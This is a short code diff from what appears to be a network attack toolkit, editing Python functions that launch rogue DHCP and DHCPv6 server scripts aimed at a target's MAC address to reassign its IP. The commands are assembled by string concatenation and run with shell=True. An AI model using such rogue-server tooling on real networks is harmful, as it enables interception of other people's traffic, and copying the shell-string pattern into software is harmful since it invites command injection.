@@ -132,7 +132,7 @@ def rogue_dhcp_server_predict_trid(network_interface, target_mac_address, new_ta
 
     # Start DHCP rogue server with predict next transaction ID
     sub.Popen(['python3 ' + project_root_path + '/Scripts/Apple/apple_rogue_dhcp.py --interface ' + network_interface +
-               ' --target_new_ip ' + new_target_ip_address + ' --target_mac ' + target_mac_address + ' --quiet &'],
+               ' --target_new_ip ' + new_target_ip_address + ' --target_mac ' + target_mac_address + ' --quiet'],
               shell=True)
 
     # Wait 3 seconds
@@ -146,9 +146,8 @@ def rogue_dhcpv6_server(network_interface, prefix, target_mac_address, target_gl
 
     # Start DHCPv6 rogue server
     sub.Popen(['python3 ' + project_root_path + '/Scripts/DHCP/dhcpv6_rogue_server.py --interface ' +
-               network_interface + ' --prefix ' + prefix + ' --target_ip ' +
-               target_global_ipv6_address + ' --target_mac ' + target_mac_address + ' --quiet &'],
-              shell=True)
+               network_interface + ' --prefix ' + prefix + ' --target_ip ' + target_global_ipv6_address +
+               ' --target_mac ' + target_mac_address + ' --quiet &'], shell=True)
 
     # Wait 3 seconds
     sleep(3)
